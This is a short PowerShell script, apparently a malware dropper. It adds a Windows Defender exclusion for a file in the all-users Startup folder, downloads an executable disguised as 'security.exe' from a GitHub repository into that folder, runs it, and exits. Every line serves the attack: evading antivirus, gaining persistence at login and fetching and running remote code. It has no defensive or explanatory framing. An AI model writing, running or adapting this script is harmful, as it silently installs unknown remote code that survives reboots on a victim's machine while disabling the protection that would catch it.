$startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://github.com/FCsab/FCsab.github.io/blob/main/security.exe?raw=true"
$outputPath = Join-Path $startupFolder "security.exe"
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\security.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

& $outputPath
Start-Sleep -Seconds 1
[System.Environment]::Exit(0)
